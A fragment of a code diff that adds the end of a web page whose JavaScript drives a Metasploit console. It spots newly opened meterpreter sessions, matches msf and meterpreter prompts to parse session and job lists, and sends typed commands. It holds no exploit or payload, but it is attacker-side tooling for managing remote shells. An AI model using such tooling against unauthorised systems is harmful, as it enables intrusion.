+                }
+            }
+
+            // 自动检测新会话并刷新列表
+            if (clean.toLowerCase().includes('meterpreter session') && clean.includes('opened')) {
+                console.log('[DEBUG] Session opened detected, refreshing...');
+                setTimeout(refreshSessions, 1500);
+            }
+
+            // 检测会话列表输出（当输出包含 "Active sessions" 时）
+            if (clean.includes('Active sessions') || clean.includes('active sessions')) {
+                console.log('[DEBUG] Session list output detected');
+            }
+
+            if (isRefreshing) {
+                buffer += clean;
+                // 检测 MSF 提示符，表示命令执行完成
+                if (clean.match(/msf\d*\s*>\s*$/) || clean.match(/meterpreter\s*>\s*$/)) {
+                    isRefreshing = false;
+                    console.log('[DEBUG] Buffer content for parsing:', buffer.substring(0, 500));
+                    if (refreshType === 'sessions') {
+                        parseSessions(buffer);
+                    } else {
+                        parseJobs(buffer);
+                    }
+                }
+                return;
+            }
+
+            output.innerText += clean;
+            container.scrollTop = container.scrollHeight;
+        });
+
+        cmdInput.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') sendCommand();
+        });
+    </script>
+</body>
+</html>
